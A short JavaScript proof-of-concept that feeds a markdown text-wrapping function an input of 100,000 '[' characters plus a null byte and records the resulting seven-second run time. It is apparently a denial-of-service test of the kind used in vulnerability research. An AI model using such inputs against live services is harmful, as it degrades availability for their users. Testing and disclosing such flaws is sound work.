const { wrapText } = require("./markdown.js");

//Attack String :""+"["*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "[";
}
str += "\u0000";

const options = {
  flattenText: true,
  maxColumns: 50,
};
var result = wrapText(str, options, "");

// real    0m7.286s
// user    0m7.256s
// sys     0m0.010s

//将文件中的所有?.修改为了.